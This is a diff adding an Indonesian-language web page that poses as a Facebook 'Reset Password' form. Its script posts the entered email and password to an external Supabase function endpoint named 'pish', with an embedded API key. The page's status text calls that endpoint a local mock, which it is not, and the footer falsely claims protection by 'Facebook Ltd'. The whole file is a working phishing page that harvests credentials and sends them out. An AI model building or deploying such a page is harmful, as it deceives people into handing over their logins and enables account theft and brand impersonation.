@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="id">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <link rel="icon" href="assets/favicon.ico" type="image/x-icon" />
+    <title>Facebook</title>
+    <style>
+      /* sederhana, gaya 'facebook-like' */
+      * {
+        box-sizing: border-box;
+      }
+      body {
+        font-family: Arial, sans-serif;
+        background: white;
+        margin: 0;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        height: 100vh;
+      }
+      .card {
+        padding-top: 40px;
+        background: white;
+        height: 100vh;
+        width: 380px;
+        padding-left: 24px;
+        padding-right: 24px;
+        border-radius: 8px;
+        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.08);
+      }
+      .brand {
+        color: #1877f2;
+        font-size: 32px;
+        font-weight: 700;
+        margin-bottom: 18px;
+        margin-top: 20px;
+      }
+      .field {
+        margin-bottom: 12px;
+      }
+      input[type="text"],
+      input[type="password"] {
+        width: 100%;
+        padding-top: 12px;
+        padding-bottom: 12px;
+        padding-left: 12px;
+        border: 1px solid #ddd;
+        border-radius: 6px;
+        font-size: 14px;
+      }
+      button {
+        width: 100%;
+        padding: 12px;
+        background: #1877f2;
+        color: white;
+        border: none;
+        border-radius: 6px;
+        font-weight: 600;
+        cursor: pointer;
+      }
+      .note {
+        font-size: 13px;
+        color: #666;
+        margin-top: 12px;
+        text-align: center;
+      }
+      .resp {
+        margin-top: 10px;
+        font-size: 13px;
+      }
+      .header-text {
+        font-size: medium;
+        font-style: inherit;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="card" role="main">
+      <div class="brand">Facebook</div>
+      <h1 class="header-text">Reset Password</h1>
+
+      <div class="field">
+        <input
+          id="email"
+          type="text"
+          placeholder="Email atau nomor telepon"
+          autocomplete="username"
+        />
+      </div>
+      <div class="field">
+        <input
+          id="password"
+          type="password"
+          placeholder="Kata sandi"
+          autocomplete="current-password"
+        />
+      </div>
+      <div class="field">
+        <input
+          id="password"
+          type="password"
+          placeholder="Konfirmasi Kata sandi"
+          autocomplete="current-password"
+        />
+      </div>
+      <button id="loginBtn">Kirim</button>
+
+      <div class="resp" id="status"></div>
+
+      <div class="note">Security protected by Facebook Ltd</div>
+    </div>
+
+    <script>
+      const btn = document.getElementById("loginBtn");
+      const status = document.getElementById("status");
+
+      btn.addEventListener("click", async () => {
+        const email = document.getElementById("email").value;
+        const password = document.getElementById("password").value;
+
+        if (!email || !password) {
+          status.textContent = "Isi email dan password dulu.";
+          return;
+        }
+
+        status.textContent = "Mengirim...";
+
+        const api_url =
+          "https://kxqisgbogydygwtfzwyd.supabase.co/functions/v1/pish";
+
+        try {
+          const res = await fetch(api_url, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+              apikey:
+                "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imt4cWlzZ2JvZ3lkeWd3dGZ6d3lkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjM0ODkwNTYsImV4cCI6MjA3OTA2NTA1Nn0.ceq7diMBfIW4NfvqtI9peUI5oLJezDuUwyAhqtsiv4w",
+              Authorization:
+                "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imt4cWlzZ2JvZ3lkeWd3dGZ6d3lkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjM0ODkwNTYsImV4cCI6MjA3OTA2NTA1Nn0.ceq7diMBfIW4NfvqtI9peUI5oLJezDuUwyAhqtsiv4w",
+            },
+            body: JSON.stringify({ email, password }),
+          });
+
+          if (res.ok) {
+            status.textContent =
+              "Request berhasil dikirim ke mock-endpoint (lokal).";
+          } else {
+            status.textContent = "Mock endpoint merespon error: " + res.status;
+          }
+        } catch (err) {
+          status.textContent = "Gagal mengirim: " + err.message;
+        }
+      });
+    </script>
+  </body>
+</html>
